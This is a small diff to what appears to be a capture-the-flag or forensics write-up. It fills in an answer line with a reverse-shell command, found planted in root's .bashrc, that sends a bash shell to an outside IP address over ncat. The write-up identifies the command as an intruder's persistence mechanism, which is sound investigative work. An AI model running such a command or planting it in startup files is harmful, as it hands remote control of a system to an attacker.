@@ -126,4 +126,4 @@ To figure out this situation, we revisit our friend .bashrc, but for the root ac
 
 and we find our culprit: yet another reverse shell.  Our malicious friend sure is persistent.
 
-**Answer:**
+**Answer:** ncat -e /bin/bash 172.10.6.9 6969
